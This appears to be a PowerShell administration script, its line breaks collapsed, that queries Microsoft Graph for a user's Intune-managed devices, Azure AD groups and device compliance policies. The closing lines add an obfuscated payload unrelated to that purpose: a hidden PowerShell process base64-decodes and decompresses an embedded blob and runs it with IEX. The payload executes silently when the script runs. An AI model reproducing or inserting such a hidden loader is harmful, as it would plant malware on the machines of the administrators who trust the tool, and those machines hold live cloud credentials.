function Get-AuthToken {[cmdletbinding()]param([Parameter(Mandatory=$true)]$User)$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User$tenant = $userUpn.HostWrite-Host "Checking for AzureAD module..."$AadModule = Get-Module -Name "AzureAD" -ListAvailableif ($AadModule -eq $null) {Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"$AadModule = Get-Module -Name "AzureADPreview" -ListAvailable}if ($AadModule -eq $null) {write-hostwrite-host "AzureAD Powershell module not installed..." -f Redwrite-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellowwrite-host "Script can't continue..." -f Redwrite-hostexit}if($AadModule.count -gt 1){$Latest_Version = ($AadModule | select version | Sort-Object)[-1]$aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }if($AadModule.count -gt 1){$aadModule = $AadModule | select -Unique}$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}else {$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"$redirectUri = "urn:ietf:wg:oauth:2.0:oob"$resourceAppIdURI = "https://graph.microsoft.com"$authority = "https://login.microsoftonline.com/$Tenant"try {$authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority$platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"$userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")$authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Resultif($authResult.AccessToken){$authHeader = @{'Content-Type'='application/json''Authorization'="Bearer " + $authResult.AccessToken'ExpiresOn'=$authResult.ExpiresOn}return $authHeader}else {Write-HostWrite-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor RedWrite-Hostbreak}}catch {write-host $_.Exception.Message -f Redwrite-host $_.Exception.ItemName -f Redwrite-hostbreak}}Function Get-AADUser(){[cmdletbinding()]param($userPrincipalName,$Property)$graphApiVersion = "v1.0"$User_resource = "users"try {if($userPrincipalName -eq "" -or $userPrincipalName -eq $null){$uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}else {if($Property -eq "" -or $Property -eq $null){$uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName"Write-Verbose $uriInvoke-RestMethod -Uri $uri -Headers $authToken -Method Get}else {$uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName/$Property"Write-Verbose $uri(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-AADUserDevices(){[cmdletbinding()]param([Parameter(Mandatory=$true,HelpMessage="UserID (guid) for the user you want to take action on must be specified:")]$UserID)$graphApiVersion = "beta"$Resource = "users/$UserID/managedDevices"try {$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"Write-Verbose $uri(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-AADGroup(){[cmdletbinding()]param($GroupName,$id,[switch]$Members)$graphApiVersion = "v1.0"$Group_resource = "groups"try {if($id){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id'"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}elseif($GroupName -eq "" -or $GroupName -eq $null){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}else {if(!$Members){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}elseif($Members){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"$Group = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Valueif($Group){$GID = $Group.id$Group.displayNamewrite-host$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-DeviceCompliancePolicy(){[cmdletbinding()]param([switch]$Android,[switch]$iOS,[switch]$Win10,$Name)$graphApiVersion = "Beta"$DCP_resource = "deviceManagement/deviceCompliancePolicies"try {$Count_Params = 0if($Android.IsPresent){ $Count_Params++ }if($iOS.IsPresent){ $Count_Params++ }if($Win10.IsPresent){ $Count_Params++ }if($Count_Params -gt 1){write-host "Multiple parameters set, specify a single parameter -Android -iOS or -Win10 against the function" -f Red}elseif($Android){$uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("android") }}elseif($iOS){$uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("ios") }}elseif($Win10){$uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("windows10CompliancePolicy") }}else {$uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-DeviceCompliancePolicyAssignment(){[cmdletbinding()]param([Parameter(Mandatory=$true,HelpMessage="Enter id (guid) for the Device Compliance Policy you want to check assignment")]$id)$graphApiVersion = "Beta"$DCP_resource = "deviceManagement/deviceCompliancePolicies"try {$uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)/$id/assignments"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-UserDeviceStatus(){[cmdletbinding()]param([switch]$Analyze)Write-Host "Getting User Devices..." -ForegroundColor YellowWrite-Host$UserDevices = Get-AADUserDevices -UserID $UserIDif($UserDevices){write-host "-------------------------------------------------------------------"Write-Hostforeach($UserDevice in $UserDevices){$UserDeviceId = $UserDevice.id$UserDeviceName = $UserDevice.deviceName$UserDeviceAADDeviceId = $UserDevice.azureActiveDirectoryDeviceId$UserDeviceComplianceState = $UserDevice.complianceStatewrite-host "Device Name:" $UserDevice.deviceName -f CyanWrite-Host "Device Id:" $UserDevice.idwrite-host "Owner Type:" $UserDevice.ownerTypewrite-host "Last Sync Date:" $UserDevice.lastSyncDateTimewrite-host "OS:" $UserDevice.operatingSystemwrite-host "OS Version:" $UserDevice.osVersionif($UserDevice.easActivated -eq $false){write-host "EAS Activated:" $UserDevice.easActivated -ForegroundColor Red}else {write-host "EAS Activated:" $UserDevice.easActivated}Write-Host "EAS DeviceId:" $UserDevice.easDeviceIdif($UserDevice.aadRegistered -eq $false){write-host "AAD Registered:" $UserDevice.aadRegistered -ForegroundColor Red}else {write-host "AAD Registered:" $UserDevice.aadRegistered}write-host "Enrollment Type:" $UserDevice.enrollmentTypewrite-host "Management State:" $UserDevice.managementStateif($UserDevice.complianceState -eq "noncompliant"){write-host "Compliance State:" $UserDevice.complianceState -f Red$uri = "https://graph.microsoft.com/beta/deviceManagement/managedDevices/$UserDeviceId/deviceCompliancePolicyStates"$deviceCompliancePolicyStates = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Valueforeach($DCPS in $deviceCompliancePolicyStates){if($DCPS.State -eq "nonCompliant"){Write-HostWrite-Host "Non Compliant Policy for device $UserDeviceName" -ForegroundColor Yellowwrite-host "Display Name:" $DCPS.displayName$SettingStatesId = $DCPS.id$uri = "https://graph.microsoft.com/beta/deviceManagement/managedDevices/$UserDeviceId/deviceCompliancePolicyStates/$SettingStatesId/settingStates?`$filter=(userId eq '$UserID')"$SettingStates = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Valueforeach($SS in $SettingStates){if($SS.state -eq "nonCompliant"){write-hostWrite-Host "Setting:" $SS.settingWrite-Host "State:" $SS.state -ForegroundColor Red}}}}$uri = "https://graph.microsoft.com/v1.0/devices?`$filter=deviceId eq '$UserDeviceAADDeviceId'"$AADDevice = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value$AAD_Compliant = $AADDevice.isCompliantWrite-HostWrite-Host "Compliance State - AAD and ManagedDevices" -ForegroundColor YellowWrite-Host "AAD Compliance State:" $AAD_CompliantWrite-Host "Intune Managed Device State:" $UserDeviceComplianceState}else {write-host "Compliance State:" $UserDevice.complianceState -f Green$uri = "https://graph.microsoft.com/v1.0/devices?`$filter=deviceId eq '$UserDeviceAADDeviceId'"$AADDevice = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value$AAD_Compliant = $AADDevice.isCompliantWrite-HostWrite-Host "Compliance State - AAD and ManagedDevices" -ForegroundColor YellowWrite-Host "AAD Compliance State:" $AAD_CompliantWrite-Host "Intune Managed Device State:" $UserDeviceComplianceState}write-hostwrite-host "-------------------------------------------------------------------"Write-Host}}else {write-host "User has no devices"write-host}}write-hostif($global:authToken){$DateTime = (Get-Date).ToUniversalTime()$TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutesif($TokenExpires -le 0){write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellowwrite-hostif($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User}}else {if($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User}write-host "User Principal Name:" -f Yellow$UPN = Read-Host$User = Get-AADUser -userPrincipalName $UPN$UserID = $User.idwrite-hostwrite-host "Display Name:"$User.displayNamewrite-host "User ID:"$User.idwrite-host "User Principal Name:"$User.userPrincipalNamewrite-host$MemberOf = Get-AADUser -userPrincipalName $UPN -Property MemberOf$AADGroups = $MemberOf | ? { $_.'@odata.type' -eq "if($AADGroups){write-host "User AAD Group Membership:" -f Yellowforeach($AADGroup in $AADGroups){(Get-AADGroup -id $AADGroup.id).displayName}write-host}else {write-host "AAD Group Membership:" -f Yellowwrite-host "No Group Membership in AAD Groups"Write-Host}$CPs = Get-DeviceCompliancePolicyif($CPs){write-host "Assigned Compliance Policies:" -f Yellow$CP_Names = @()foreach($CP in $CPs){$id = $CP.id$DCPA = Get-DeviceCompliancePolicyAssignment -id $idif($DCPA){foreach($Com_Group in $DCPA){if($AADGroups.id -contains $Com_Group.target.GroupId){$CP_Names += $CP.displayName + " - " + $CP.'@odata.type'}}}}if($CP_Names -ne $null){$CP_Names}else {write-host "No Device Compliance Policies Assigned"}}else {write-host "Device Compliance Policies:" -f Yellowwrite-host "No Device Compliance Policies Assigned"}write-hostGet-UserDeviceStatusif([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAEEoilgCA7VW+2/aSBD+OZX6P1gVErZKsAmPNpEi3ZqXnUACMZgQik4be20W1l5ir8Oj1//9xmCSVE2qVKezErHeeezMN9/s2EtCR1AeSpQa0vePH456OMKBJOfcaocmSUHK8aahHB2BJLe8i8LgemBG0rkkT9By2eABpuH07KyeRBEJxf692CYCxTEJ7hklsaxI/0ijGYnI8fX9nDhC+i7l/i62Gb/HLFPb1LEzI9IxCt1U1uEOTmMqWktGhZz/9i2vTI5L02LzIcEslvPWJhYkKLqM5RXph5IeONgsiZzvUifiMfdEcUTD8klxGMbYI1fg7ZF0iZhxN84rkAr8RUQkUSg9J5V62evIeVj2Iu4g141IDCZFM3zkCyLnwoSxgvSXPMlCuElCQQMCckEivrRI9EgdEhcNHLqM3BBvKl+R1SHz9xrJL41AqycipQA1eSvWLncTRvbmeeXXaLNiKvBkBQUQfnz88PGD91R+18e1W7NSekkCWB1NdmsCkco9HtOd8rmkFaQuHIcFjzbwmhtECVGm0iQtw2Q6lXLO6Esl2M5rFb3wtpfSwQQMqDZfwtbE5tSdgklWptymPi7f26MhSYVvc65BPBqSxibEAXUOtJJfA594jOxyLh7UriAyOZ8JiNsgjPhYpEgWpMmvZs2AiidbPaHMJRFyoIAxRAW1VX4OZl8cOW+GXRIAXPv3PBTCAzKTg3ZG4M3h9PQdlPJ1huO4IPUS6CanIFkEM+IWJBTGNBOhRPDdMv8cbjdhgjo4Fgd3U+UnMLND6zyMRZQ4UEYAYGAtiUMxS/EoSAZ1ib6xqH84PP8qGnXMGA198PQI1YCdFAVLpOSIIM4XRFCKFhFmsGQkAM1dh7cY9qGfs4bYcQr7xM2/GuyB8Ht2p9gcQHkRKhTcYlwUJJtGAm6LFOeUWv8lkhe3xXNM9YhkVZIPzTTRNyJlf4615yyla4bWDptIAC6tiAc6jkmtYokIUJM/qde0juAZmyHrOvqCltCKlswu/A9p2eSNL+7lxdxQo8Z65iEzNrtGr9E3jMrjhWVXhNU0xWXPFN3m7XxuIeNmOBZ3JjIGVFuMK9vlBd1aHeSO12ptq29Xmr7ezn3XGzc8z//iWTelaot2RvW+rp3gTqOZdEb6StcqcZOujD4d9hcXLXE/thkeeqp/WzrFdN2J5naJd7cmQu1Z2dleeHZ71nU3Y0M9HVUWqIlQPWzaLZ1fjvUI9VR72NL7w6be78NezVe9Cuyxz/51mjdp25s7q7q4a1e3naDKXKTzB8vXfNChGnKwb/cxMlHT3lxUA963mQsNb2tjT7Vnjq7VH0+v68ZtXGvDuUh/QG3eTHWQCM1bVbV91UfeHHeugiXCCPVBZ4R9nY8ubwZV8LEoXT2g1t3APvHrJ87Mgxwan5F+arIZT1MBf2jY9jud1deVemrfYsNOBiNDLdlVoq5Wi9roXlXVr/pqE7Zdx2skar3E2R347Kml/vn5p5RAwKDcup/Ea9HevODFW3Ogi6N4hhnwBe72QwO3eNTKLusep6mFLKcze0GikDCYdTAND6RHjHEnnRjPtzqMrP0gmUIXD2FZPnl1pUhPisrzJDlsnZ3dQaTQSynDix0S+mJW0NZlTYOBoK0rGmT7/uzqfLmRd64K6UB5gujgn+38K2lr5eaVMq9V7k3yv+KXNfUMftx34fe89xvpuzDVCs/5/yL6eeOPQP5TCEaYClC04HZiZD86f4NERpoX3xxPhQJeeNmTfgJeJ+L4Cr5H/gVIpczGcQoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);